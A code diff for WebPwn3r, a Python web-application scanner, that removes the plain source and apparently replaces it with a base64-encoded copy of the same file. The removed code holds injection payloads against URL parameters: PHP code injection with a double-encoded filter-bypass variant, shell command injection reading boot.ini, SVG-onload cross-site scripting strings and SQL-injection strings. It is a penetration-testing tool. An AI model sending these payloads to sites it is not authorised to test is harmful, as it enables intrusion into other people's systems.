@@ -1,81 +1,76 @@
-#!/usr/bin/env python
-# WebPwn3r is a Web Applications Security Scanner
-# By Ebrahim Hegazy - twitter.com/zigoo0
-# First demo conducted 12Apr-2014 @OWASP Chapter Egypt
-# https://www.owasp.org/index.php/Cairo
-import urllib
-import re
-from headers import *
-
-#updates:
-# 1- Fixed the empty parameters issue => Done.
-# 2- User agents when sending a Request => Done.
-# 3- Added Error Based SQLI Detection Support => Done.
-# 4- Will try to add XSS Injection in Cookies, Refere and UserAgent
-
-def main_function(url, payloads, check):
-        #This function is going to split the url and try the append paylods in every parameter value.
-        opener = urllib.urlopen(url)
-	vuln = 0
-        if opener.code == 999:
-                # Detetcing the WebKnight WAF from the StatusCode.
-                print ga.red +" [~] WebKnight WAF Detected!"+ga.end
-                print ga.red +" [~] Delaying 3 seconds between every request"+ga.end
-                time.sleep(3)
-        for params in url.split("?")[1].split("&"):
-            #sp = params.split("=")[0]
-            for payload in payloads:
-                #bugs = url.replace(sp, str(payload).strip())
-                bugs = url.replace(params, params + str(payload).strip())
-		#print bugs
-		#exit()
-                request = useragent.open(bugs)
-		html = request.readlines()
-                for line in html:
-                    checker = re.findall(check, line)
-                    if len(checker) !=0:
-                        print ga.red+" [*] Payload Found . . ."+ga.end
-                        print ga.red+" [*] Payload: " ,payload +ga.end
-                        print ga.green+" [!] Code Snippet: " +ga.end + line.strip()
-                        print ga.blue+" [*] POC: "+ga.end + bugs
-                        print ga.green+" [*] Happy Exploitation :D"+ga.end
-                        vuln +=1
-        if vuln == 0:                
-        	print ga.green+" [!] Target is not vulnerable!"+ga.end
-        else:
-        	print ga.blue+" [!] Congratulations you've found %i bugs :-) " % (vuln) +ga.end
-
-# Here stands the vulnerabilities functions and detection payloads. 
-def rce_func(url):
-	headers_reader(url)
-  	print ga.bold+" [!] Now Scanning for Remote Code/Command Execution "+ga.end
-  	print ga.blue+" [!] Covering Linux & Windows Operating Systems "+ga.end
-  	print ga.blue+" [!] Please wait ...."+ga.end
-  	# Remote Code Injection Payloads
-  	payloads = [';${@print(md5(zigoo0))}', ';${@print(md5("zigoo0"))}']
-  	# Below is the Encrypted Payloads to bypass some Security Filters & WAF's
-  	payloads += ['%253B%2524%257B%2540print%2528md5%2528%2522zigoo0%2522%2529%2529%257D%253B']
-  	# Remote Command Execution Payloads
-  	payloads += [';uname;', '&&dir', '&&type C:\\boot.ini', ';phpinfo();', ';phpinfo']
-  	# used re.I to fix the case sensitve issues like "payload" and "PAYLOAD".
-  	check = re.compile("51107ed95250b4099a0f481221d56497|Linux|eval\(\)|SERVER_ADDR|Volume.+Serial|\[boot", re.I)
-  	main_function(url, payloads, check)
-
-def xss_func(url):
-        print ga.bold+"\n [!] Now Scanning for XSS "+ga.end
-        print ga.blue+" [!] Please wait ...."+ga.end
-        #Paylod zigoo="css();" added for XSS in <a href TAG's
-        payloads = ['%27%3Ezigoo0%3Csvg%2Fonload%3Dconfirm%28%2Fzigoo0%2F%29%3Eweb', '%78%22%78%3e%78']
-        payloads += ['%22%3Ezigoo0%3Csvg%2Fonload%3Dconfirm%28%2Fzigoo0%2F%29%3Eweb', 'zigoo0%3Csvg%2Fonload%3Dconfirm%28%2Fzigoo0%2F%29%3Eweb']
-        check = re.compile('zigoo0<svg|x>x', re.I)
-        main_function(url, payloads, check)
-
-def error_based_sqli_func(url):
-	print ga.bold+"\n [!] Now Scanning for Error Based SQL Injection "+ga.end
-	print ga.blue+" [!] Covering MySQL, Oracle, MSSQL, MSACCESS & PostGreSQL Databases "+ga.end
-	print ga.blue+" [!] Please wait ...."+ga.end
-	# Payload = 12345'"\'\");|]*{%0d%0a<%00>%bf%27'  Yeaa let's bug the query :D :D
-	# added chinese char to the SQLI payloads to bypass mysql_real_escape_*
-	payloads = ["3'", "3%5c", "3%27%22%28%29", "3'><", "3%22%5C%27%5C%22%29%3B%7C%5D%2A%7B%250d%250a%3C%2500%3E%25bf%2527%27"]
-	check = re.compile("Incorrect syntax|Syntax error|Unclosed.+mark|unterminated.+qoute|SQL.+Server|Microsoft.+Database|Fatal.+error", re.I)
-	main_function(url, payloads, check)
+IyEvdXNyL2Jpbi9lbnYgcHl0aG9uDQojIFdlYlB3bjNyIGlzIGEgV2ViIEFwcGxpY2F0aW9ucyBT
+ZWN1cml0eSBTY2FubmVyDQojIEJ5IEVicmFoaW0gSGVnYXp5IC0gdHdpdHRlci5jb20vemlnb28w
+DQojIEZpcnN0IGRlbW8gY29uZHVjdGVkIDEyQXByLTIwMTQgQE9XQVNQIENoYXB0ZXIgRWd5cHQN
+CiMgaHR0cHM6Ly93d3cub3dhc3Aub3JnL2luZGV4LnBocC9DYWlybw0KaW1wb3J0IHVybGxpYg0K
+aW1wb3J0IHJlDQpmcm9tIGhlYWRlcnMgaW1wb3J0ICoNCg0KI3VwZGF0ZXM6DQojIDEtIEZpeGVk
+IHRoZSBlbXB0eSBwYXJhbWV0ZXJzIGlzc3VlID0+IERvbmUuDQojIDItIFVzZXIgYWdlbnRzIHdo
+ZW4gc2VuZGluZyBhIFJlcXVlc3QgPT4gRG9uZS4NCiMgMy0gQWRkZWQgRXJyb3IgQmFzZWQgU1FM
+SSBEZXRlY3Rpb24gU3VwcG9ydCA9PiBEb25lLg0KIyA0LSBXaWxsIHRyeSB0byBhZGQgWFNTIElu
+amVjdGlvbiBpbiBDb29raWVzLCBSZWZlcmUgYW5kIFVzZXJBZ2VudA0KDQpkZWYgbWFpbl9mdW5j
+dGlvbih1cmwsIHBheWxvYWRzLCBjaGVjayk6DQogICAgICAgICNUaGlzIGZ1bmN0aW9uIGlzIGdv
+aW5nIHRvIHNwbGl0IHRoZSB1cmwgYW5kIHRyeSB0aGUgYXBwZW5kIHBheWxvZHMgaW4gZXZlcnkg
+cGFyYW1ldGVyIHZhbHVlLg0KICAgICAgICBvcGVuZXIgPSB1cmxsaWIudXJsb3Blbih1cmwpDQoJ
+dnVsbiA9IDANCiAgICAgICAgaWYgb3BlbmVyLmNvZGUgPT0gOTk5Og0KICAgICAgICAgICAgICAg
+ICMgRGV0ZXRjaW5nIHRoZSBXZWJLbmlnaHQgV0FGIGZyb20gdGhlIFN0YXR1c0NvZGUuDQogICAg
+ICAgICAgICAgICAgcHJpbnQgZ2EucmVkICsiIFt+XSBXZWJLbmlnaHQgV0FGIERldGVjdGVkISIr
+Z2EuZW5kDQogICAgICAgICAgICAgICAgcHJpbnQgZ2EucmVkICsiIFt+XSBEZWxheWluZyAzIHNl
+Y29uZHMgYmV0d2VlbiBldmVyeSByZXF1ZXN0IitnYS5lbmQNCiAgICAgICAgICAgICAgICB0aW1l
+LnNsZWVwKDMpDQogICAgICAgIGZvciBwYXJhbXMgaW4gdXJsLnNwbGl0KCI/IilbMV0uc3BsaXQo
+IiYiKToNCiAgICAgICAgICAgICNzcCA9IHBhcmFtcy5zcGxpdCgiPSIpWzBdDQogICAgICAgICAg
+ICBmb3IgcGF5bG9hZCBpbiBwYXlsb2FkczoNCiAgICAgICAgICAgICAgICAjYnVncyA9IHVybC5y
+ZXBsYWNlKHNwLCBzdHIocGF5bG9hZCkuc3RyaXAoKSkNCiAgICAgICAgICAgICAgICBidWdzID0g
+dXJsLnJlcGxhY2UocGFyYW1zLCBwYXJhbXMgKyBzdHIocGF5bG9hZCkuc3RyaXAoKSkNCgkJI3By
+aW50IGJ1Z3MNCgkJI2V4aXQoKQ0KICAgICAgICAgICAgICAgIHJlcXVlc3QgPSB1c2VyYWdlbnQu
+b3BlbihidWdzKQ0KCQlodG1sID0gcmVxdWVzdC5yZWFkbGluZXMoKQ0KICAgICAgICAgICAgICAg
+IGZvciBsaW5lIGluIGh0bWw6DQogICAgICAgICAgICAgICAgICAgIGNoZWNrZXIgPSByZS5maW5k
+YWxsKGNoZWNrLCBsaW5lKQ0KICAgICAgICAgICAgICAgICAgICBpZiBsZW4oY2hlY2tlcikgIT0w
+Og0KICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQgZ2EucmVkKyIgWypdIFBheWxvYWQgRm91
+bmQgLiAuIC4iK2dhLmVuZA0KICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQgZ2EucmVkKyIg
+WypdIFBheWxvYWQ6ICIgLHBheWxvYWQgK2dhLmVuZA0KICAgICAgICAgICAgICAgICAgICAgICAg
+cHJpbnQgZ2EuZ3JlZW4rIiBbIV0gQ29kZSBTbmlwcGV0OiAiICtnYS5lbmQgKyBsaW5lLnN0cmlw
+KCkNCiAgICAgICAgICAgICAgICAgICAgICAgIHByaW50IGdhLmJsdWUrIiBbKl0gUE9DOiAiK2dh
+LmVuZCArIGJ1Z3MNCiAgICAgICAgICAgICAgICAgICAgICAgIHByaW50IGdhLmdyZWVuKyIgWypd
+IEhhcHB5IEV4cGxvaXRhdGlvbiA6RCIrZ2EuZW5kDQogICAgICAgICAgICAgICAgICAgICAgICB2
+dWxuICs9MQ0KICAgICAgICBpZiB2dWxuID09IDA6ICAgICAgICAgICAgICAgIA0KICAgICAgICAJ
+cHJpbnQgZ2EuZ3JlZW4rIiBbIV0gVGFyZ2V0IGlzIG5vdCB2dWxuZXJhYmxlISIrZ2EuZW5kDQog
+ICAgICAgIGVsc2U6DQogICAgICAgIAlwcmludCBnYS5ibHVlKyIgWyFdIENvbmdyYXR1bGF0aW9u
+cyB5b3UndmUgZm91bmQgJWkgYnVncyA6LSkgIiAlICh2dWxuKSArZ2EuZW5kDQoNCiMgSGVyZSBz
+dGFuZHMgdGhlIHZ1bG5lcmFiaWxpdGllcyBmdW5jdGlvbnMgYW5kIGRldGVjdGlvbiBwYXlsb2Fk
+cy4gDQpkZWYgcmNlX2Z1bmModXJsKToNCgloZWFkZXJzX3JlYWRlcih1cmwpDQogIAlwcmludCBn
+YS5ib2xkKyIgWyFdIE5vdyBTY2FubmluZyBmb3IgUmVtb3RlIENvZGUvQ29tbWFuZCBFeGVjdXRp
+b24gIitnYS5lbmQNCiAgCXByaW50IGdhLmJsdWUrIiBbIV0gQ292ZXJpbmcgTGludXggJiBXaW5k
+b3dzIE9wZXJhdGluZyBTeXN0ZW1zICIrZ2EuZW5kDQogIAlwcmludCBnYS5ibHVlKyIgWyFdIFBs
+ZWFzZSB3YWl0IC4uLi4iK2dhLmVuZA0KICAJIyBSZW1vdGUgQ29kZSBJbmplY3Rpb24gUGF5bG9h
+ZHMNCiAgCXBheWxvYWRzID0gWyc7JHtAcHJpbnQobWQ1KHppZ29vMCkpfScsICc7JHtAcHJpbnQo
+bWQ1KCJ6aWdvbzAiKSl9J10NCiAgCSMgQmVsb3cgaXMgdGhlIEVuY3J5cHRlZCBQYXlsb2FkcyB0
+byBieXBhc3Mgc29tZSBTZWN1cml0eSBGaWx0ZXJzICYgV0FGJ3MNCiAgCXBheWxvYWRzICs9IFsn
+JTI1M0IlMjUyNCUyNTdCJTI1NDBwcmludCUyNTI4bWQ1JTI1MjglMjUyMnppZ29vMCUyNTIyJTI1
+MjklMjUyOSUyNTdEJTI1M0InXQ0KICAJIyBSZW1vdGUgQ29tbWFuZCBFeGVjdXRpb24gUGF5bG9h
+ZHMNCiAgCXBheWxvYWRzICs9IFsnO3VuYW1lOycsICcmJmRpcicsICcmJnR5cGUgQzpcXGJvb3Qu
+aW5pJywgJztwaHBpbmZvKCk7JywgJztwaHBpbmZvJ10NCiAgCSMgdXNlZCByZS5JIHRvIGZpeCB0
+aGUgY2FzZSBzZW5zaXR2ZSBpc3N1ZXMgbGlrZSAicGF5bG9hZCIgYW5kICJQQVlMT0FEIi4NCiAg
+CWNoZWNrID0gcmUuY29tcGlsZSgiNTExMDdlZDk1MjUwYjQwOTlhMGY0ODEyMjFkNTY0OTd8TGlu
+dXh8ZXZhbFwoXCl8U0VSVkVSX0FERFJ8Vm9sdW1lLitTZXJpYWx8XFtib290IiwgcmUuSSkNCiAg
+CW1haW5fZnVuY3Rpb24odXJsLCBwYXlsb2FkcywgY2hlY2spDQoNCmRlZiB4c3NfZnVuYyh1cmwp
+Og0KICAgICAgICBwcmludCBnYS5ib2xkKyJcbiBbIV0gTm93IFNjYW5uaW5nIGZvciBYU1MgIitn
+YS5lbmQNCiAgICAgICAgcHJpbnQgZ2EuYmx1ZSsiIFshXSBQbGVhc2Ugd2FpdCAuLi4uIitnYS5l
+bmQNCiAgICAgICAgI1BheWxvZCB6aWdvbz0iY3NzKCk7IiBhZGRlZCBmb3IgWFNTIGluIDxhIGhy
+ZWYgVEFHJ3MNCiAgICAgICAgcGF5bG9hZHMgPSBbJyUyNyUzRXppZ29vMCUzQ3N2ZyUyRm9ubG9h
+ZCUzRGNvbmZpcm0lMjglMkZ6aWdvbzAlMkYlMjklM0V3ZWInLCAnJTc4JTIyJTc4JTNlJTc4J10N
+CiAgICAgICAgcGF5bG9hZHMgKz0gWyclMjIlM0V6aWdvbzAlM0NzdmclMkZvbmxvYWQlM0Rjb25m
+aXJtJTI4JTJGemlnb28wJTJGJTI5JTNFd2ViJywgJ3ppZ29vMCUzQ3N2ZyUyRm9ubG9hZCUzRGNv
+bmZpcm0lMjglMkZ6aWdvbzAlMkYlMjklM0V3ZWInXQ0KICAgICAgICBjaGVjayA9IHJlLmNvbXBp
+bGUoJ3ppZ29vMDxzdmd8eD54JywgcmUuSSkNCiAgICAgICAgbWFpbl9mdW5jdGlvbih1cmwsIHBh
+eWxvYWRzLCBjaGVjaykNCg0KZGVmIGVycm9yX2Jhc2VkX3NxbGlfZnVuYyh1cmwpOg0KCXByaW50
+IGdhLmJvbGQrIlxuIFshXSBOb3cgU2Nhbm5pbmcgZm9yIEVycm9yIEJhc2VkIFNRTCBJbmplY3Rp
+b24gIitnYS5lbmQNCglwcmludCBnYS5ibHVlKyIgWyFdIENvdmVyaW5nIE15U1FMLCBPcmFjbGUs
+IE1TU1FMLCBNU0FDQ0VTUyAmIFBvc3RHcmVTUUwgRGF0YWJhc2VzICIrZ2EuZW5kDQoJcHJpbnQg
+Z2EuYmx1ZSsiIFshXSBQbGVhc2Ugd2FpdCAuLi4uIitnYS5lbmQNCgkjIFBheWxvYWQgPSAxMjM0
+NSciXCdcIik7fF0qeyUwZCUwYTwlMDA+JWJmJTI3JyAgWWVhYSBsZXQncyBidWcgdGhlIHF1ZXJ5
+IDpEIDpEDQoJIyBhZGRlZCBjaGluZXNlIGNoYXIgdG8gdGhlIFNRTEkgcGF5bG9hZHMgdG8gYnlw
+YXNzIG15c3FsX3JlYWxfZXNjYXBlXyoNCglwYXlsb2FkcyA9IFsiMyciLCAiMyU1YyIsICIzJTI3
+JTIyJTI4JTI5IiwgIjMnPjwiLCAiMyUyMiU1QyUyNyU1QyUyMiUyOSUzQiU3QyU1RCUyQSU3QiUy
+NTBkJTI1MGElM0MlMjUwMCUzRSUyNWJmJTI1MjclMjciXQ0KCWNoZWNrID0gcmUuY29tcGlsZSgi
+SW5jb3JyZWN0IHN5bnRheHxTeW50YXggZXJyb3J8VW5jbG9zZWQuK21hcmt8dW50ZXJtaW5hdGVk
+Litxb3V0ZXxTUUwuK1NlcnZlcnxNaWNyb3NvZnQuK0RhdGFiYXNlfEZhdGFsLitlcnJvciIsIHJl
+LkkpDQoJbWFpbl9mdW5jdGlvbih1cmwsIHBheWxvYWRzLCBjaGVjaykNCg==
